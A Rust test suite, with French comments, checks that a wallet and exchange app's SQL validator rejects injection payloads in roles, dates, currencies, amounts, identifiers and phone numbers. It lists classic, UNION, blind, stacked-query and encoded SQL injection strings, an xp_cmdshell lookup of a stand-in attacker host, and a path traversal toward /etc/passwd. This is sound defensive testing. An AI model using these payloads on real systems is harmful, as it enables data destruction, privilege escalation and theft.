#[cfg(test)]
mod sql_injection_security_tests {
    use crate::shared::sql_validator::SqlValidator;
    use crate::application::auth::service::AuthService;
    use crate::application::exchange::wallet_service::WalletService;
    use crate::shared::errors::AppError;
    use uuid::Uuid;
    use chrono::{DateTime, Utc};
    
    /// Test vectors d'attaques SQL injection communes
    fn get_sql_injection_payloads() -> Vec<String> {
        vec![
            // Classic SQL injection
            "' OR '1'='1".to_string(),
            "'; DROP TABLE users; --".to_string(),
            "admin'--".to_string(),
            "' OR 1=1--".to_string(),
            "1' AND '1' = '1".to_string(),
            
            // UNION attacks
            "' UNION SELECT * FROM users--".to_string(),
            "' UNION ALL SELECT null, null, null--".to_string(),
            "1 UNION SELECT username, password FROM users".to_string(),
            
            // Boolean-based blind
            "' AND 1=1--".to_string(),
            "' AND 1=2--".to_string(),
            "1' AND (SELECT COUNT(*) FROM users) > 0--".to_string(),
            
            // Time-based blind
            "'; WAITFOR DELAY '00:00:05'--".to_string(),
            "1'; SELECT SLEEP(5); --".to_string(),
            "'; SELECT pg_sleep(5); --".to_string(),
            
            // Stacked queries
            "1; DELETE FROM wallets WHERE '1'='1".to_string(),
            "'; UPDATE users SET role='admin' WHERE id=1; --".to_string(),
            
            // Out-of-band
            "'; EXEC xp_cmdshell('nslookup attacker.com'); --".to_string(),
            
            // Second-order injection
            "admin'||'".to_string(),
            "' + '".to_string(),
            
            // Encoding bypass attempts
            "%27%20OR%20%271%27%3D%271".to_string(),
            "\\' OR \\'1\\'=\\'1".to_string(),
        ]
    }
    
    #[test]
    fn test_sql_validator_detects_all_injection_patterns() {
        let payloads = get_sql_injection_payloads();
        let mut detected_count = 0;
        let mut missed_payloads = Vec::new();
        
        for payload in &payloads {
            if SqlValidator::detect_sql_injection_patterns(payload) {
                detected_count += 1;
            } else {
                missed_payloads.push(payload.clone());
            }
        }
        
        // Afficher les payloads non détectés pour debug
        if !missed_payloads.is_empty() {
            println!("Warning: Missed payloads: {:?}", missed_payloads);
        }
        
        // Au moins 90% des payloads doivent être détectés
        let detection_rate = (detected_count as f64) / (payloads.len() as f64);
        assert!(
            detection_rate >= 0.9,
            "Detection rate too low: {:.2}% (detected {}/{})",
            detection_rate * 100.0,
            detected_count,
            payloads.len()
        );
    }
    
    #[test]
    fn test_role_validation_prevents_injection() {
        let malicious_roles = vec![
            "admin' OR '1'='1",
            "'; DROP TABLE users; --",
            "admin'--",
            "' UNION SELECT * FROM users WHERE role='admin",
            "client'; UPDATE users SET role='admin'",
        ];
        
        for malicious_role in malicious_roles {
            let result = SqlValidator::validate_user_role(malicious_role);
            assert!(
                result.is_err(),
                "Malicious role should be rejected: {}",
                malicious_role
            );
            
            if let Err(e) = result {
                // Vérifier que c'est bien une erreur de validation
                match e {
                    AppError::Validation(_) => {},
                    _ => panic!("Expected ValidationError for: {}", malicious_role),
                }
            }
        }
    }
    
    #[test]
    fn test_datetime_validation_prevents_injection() {
        let malicious_dates = vec![
            "2024-01-01'; DROP TABLE wallets; --",
            "' OR '1'='1",
            "2024-01-01T00:00:00Z' UNION SELECT * FROM users--",
            "'; DELETE FROM wallet_transactions WHERE '1'='1",
            "2024-01-01T00:00:00Z'; WAITFOR DELAY '00:00:05'--",
        ];
        
        for malicious_date in malicious_dates {
            let result = SqlValidator::validate_datetime_string(malicious_date);
            assert!(
                result.is_err(),
                "Malicious date should be rejected: {}",
                malicious_date
            );
        }
    }
    
    #[test]
    fn test_currency_validation_prevents_injection() {
        let malicious_currencies = vec![
            "XOF'; DROP TABLE rates; --",
            "EUR' OR '1'='1",
            "USD'; DELETE FROM exchange_rates--",
            "' UNION SELECT * FROM wallets--",
        ];
        
        for malicious_currency in malicious_currencies {
            let result = SqlValidator::validate_currency(malicious_currency);
            assert!(
                result.is_err(),
                "Malicious currency should be rejected: {}",
                malicious_currency
            );
        }
    }
    
    #[test]
    fn test_amount_validation_prevents_injection() {
        let malicious_amounts = vec![
            "100'; DROP TABLE wallets; --",
            "1000' OR '1'='1",
            "500'; UPDATE wallets SET balance=999999--",
            "-100",  // Negative amount
            "999999999999999",  // Exceeds maximum
        ];
        
        for malicious_amount in malicious_amounts {
            let result = SqlValidator::validate_amount(malicious_amount);
            assert!(
                result.is_err(),
                "Malicious amount should be rejected: {}",
                malicious_amount
            );
        }
    }
    
    #[test]
    fn test_identifier_validation_prevents_injection() {
        let malicious_ids = vec![
            "550e8400-e29b-41d4-a716-446655440000'; DROP TABLE--",
            "123'; DELETE FROM users--",
            "' OR '1'='1",
            "not-a-valid-uuid",
            "../../../etc/passwd",
        ];
        
        for malicious_id in malicious_ids {
            let result = SqlValidator::validate_identifier(malicious_id);
            assert!(
                result.is_err(),
                "Malicious identifier should be rejected: {}",
                malicious_id
            );
        }
    }
    
    #[test]
    fn test_phone_validation_prevents_injection() {
        let malicious_phones = vec![
            "+225'; DROP TABLE users; --",
            "0123456789' OR '1'='1",
            "'; DELETE FROM users--",
            "123",  // Too short
            "12345678901234567890",  // Too long
        ];
        
        for malicious_phone in malicious_phones {
            let result = SqlValidator::validate_phone_number(malicious_phone);
            assert!(
                result.is_err(),
                "Malicious phone should be rejected: {}",
                malicious_phone
            );
        }
    }
    
    #[test]
    fn test_pagination_validation_prevents_overflow() {
        // Test limit overflow
        assert!(SqlValidator::validate_pagination(0, 0).is_err());
        assert!(SqlValidator::validate_pagination(101, 0).is_err());
        assert!(SqlValidator::validate_pagination(9999999, 0).is_err());
        
        // Test offset overflow  
        assert!(SqlValidator::validate_pagination(10, 10001).is_err());
        assert!(SqlValidator::validate_pagination(10, 9999999).is_err());
        
        // Valid cases
        assert!(SqlValidator::validate_pagination(10, 0).is_ok());
        assert!(SqlValidator::validate_pagination(50, 100).is_ok());
        assert!(SqlValidator::validate_pagination(100, 9999).is_ok());
    }
    
    #[test]
    fn test_legitimate_inputs_are_allowed() {
        // Test des entrées légitimes qui ne doivent PAS être bloquées
        
        // Rôles valides
        assert!(SqlValidator::validate_user_role("client").is_ok());
        assert!(SqlValidator::validate_user_role("changeur").is_ok());
        assert!(SqlValidator::validate_user_role("admin").is_ok());
        
        // Dates valides
        assert!(SqlValidator::validate_datetime_string("2024-01-01T12:00:00Z").is_ok());
        assert!(SqlValidator::validate_datetime_string("2024-12-31T23:59:59.999Z").is_ok());
        
        // Devises valides
        assert!(SqlValidator::validate_currency("XOF").is_ok());
        assert!(SqlValidator::validate_currency("EUR").is_ok());
        assert!(SqlValidator::validate_currency("USD").is_ok());
        
        // Montants valides
        assert!(SqlValidator::validate_amount("100.50").is_ok());
        assert!(SqlValidator::validate_amount("1000000").is_ok());
        assert!(SqlValidator::validate_amount("0.01").is_ok());
        
        // Identifiants valides
        assert!(SqlValidator::validate_identifier("550e8400-e29b-41d4-a716-446655440000").is_ok());
        assert!(SqlValidator::validate_identifier("123456").is_ok());
        
        // Téléphones valides
        assert!(SqlValidator::validate_phone_number("+22501234567").is_ok());
        assert!(SqlValidator::validate_phone_number("0123456789").is_ok());
    }
    
    #[test]
    fn test_escape_function_works_correctly() {
        // Test de la fonction d'échappement (dernier recours)
        assert_eq!(
            SqlValidator::escape_sql_string("O'Reilly"),
            "O''Reilly"
        );
        
        assert_eq!(
            SqlValidator::escape_sql_string("'; DROP TABLE--"),
            "''; DROP TABLE--"
        );
        
        assert_eq!(
            SqlValidator::escape_sql_string("Line1\nLine2"),
            "Line1\\nLine2"
        );
    }
    
    #[test]
    fn test_complex_injection_patterns() {
        // Tests de patterns d'injection plus complexes
        
        // Nested injections
        assert!(SqlValidator::detect_sql_injection_patterns(
            "admin' AND (SELECT COUNT(*) FROM (SELECT * FROM users)) > 0--"
        ));
        
        // Hex encoding
        assert!(SqlValidator::detect_sql_injection_patterns(
            "0x27204F52202731273D2731"
        ));
        
        // Comments variations
        assert!(SqlValidator::detect_sql_injection_patterns("admin'/*comment*/--"));
        assert!(SqlValidator::detect_sql_injection_patterns("admin'#comment"));
        
        // Function calls
        assert!(SqlValidator::detect_sql_injection_patterns("CHAR(65)||CHAR(66)"));
        assert!(SqlValidator::detect_sql_injection_patterns("CONCAT(username,password)"));
    }
    
    #[test]
    fn test_performance_of_validation() {
        use std::time::Instant;
        
        let start = Instant::now();
        
        // Effectuer 1000 validations
        for _ in 0..1000 {
            let _ = SqlValidator::validate_user_role("client");
            let _ = SqlValidator::validate_currency("EUR");
            let _ = SqlValidator::validate_amount("100.50");
            let _ = SqlValidator::detect_sql_injection_patterns("normal input");
        }
        
        let duration = start.elapsed();
        
        // Les validations doivent être rapides (moins de 100ms pour 1000 validations)
        assert!(
            duration.as_millis() < 100,
            "Validation performance too slow: {:?}ms",
            duration.as_millis()
        );
    }
    
    #[test]
    fn test_edge_cases() {
        // Empty strings
        assert!(SqlValidator::validate_user_role("").is_err());
        assert!(SqlValidator::validate_currency("").is_err());
        assert!(SqlValidator::validate_identifier("").is_err());
        
        // Very long strings (potential buffer overflow)
        let long_string = "a".repeat(10000);
        assert!(SqlValidator::detect_sql_injection_patterns(&long_string));
        
        // Unicode characters
        assert!(SqlValidator::detect_sql_injection_patterns("'; DROP TABLE użytkownicy; --"));
        
        // Null bytes
        assert!(SqlValidator::detect_sql_injection_patterns("admin\0"));
    }
}

#[cfg(test)]
mod integration_tests {
    use super::*;
    
    #[tokio::test]
    async fn test_wallet_service_with_injection_attempts() {
        // Ce test nécessiterait une base de données de test
        // Pour l'instant, on vérifie juste que les validations sont en place
        
        let malicious_date = "2024-01-01'; DROP TABLE wallets; --";
        
        // Essayer de parser la date malveillante devrait échouer
        use chrono::DateTime;
        let result = DateTime::parse_from_rfc3339(malicious_date);
        assert!(result.is_err(), "Malicious date should not parse");
    }
    
    #[tokio::test]
    async fn test_auth_service_with_injection_attempts() {
        // Vérifier que les rôles malveillants sont rejetés
        use crate::shared::sql_validator::SqlValidator;
        
        let malicious_role = "admin' OR '1'='1";
        let result = SqlValidator::validate_user_role(malicious_role);
        assert!(result.is_err(), "Malicious role should be rejected");
    }
}